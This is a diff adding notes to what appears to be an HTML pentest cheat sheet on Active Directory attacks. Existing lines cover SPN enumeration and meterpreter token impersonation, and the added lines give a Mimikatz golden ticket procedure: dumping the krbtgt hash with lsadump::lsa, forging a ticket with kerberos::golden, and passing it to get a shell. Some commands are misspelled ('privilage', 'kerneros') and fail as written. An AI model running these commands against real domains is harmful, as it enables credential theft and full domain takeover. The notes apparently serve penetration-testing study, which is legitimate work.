@@ -102,3 +102,12 @@ Get-DomainUser * -spn | select samaccountname <br>
 <br>
   <h1>Token Impersonation</h1><br>
   meterpreter - impersonate_token (use on machine a DA has a session) <br>
+  <br>
+  <h1>golden ticket </h1> <br>
+  Run mimikatz.exe <br>
+  run - privilage::debug <br>
+  run - lsadump::lsa /inject /name:krbtgt <br>
+  copy SID of domain to notepad, copy NTLM hash and paste to notepad <br>
+  run kerneros::golden /User:Administrator /domain: /sid: /krbtgt:addhashhere /id:500 /ptt <br>
+  misc::cmd <br>
+  run command
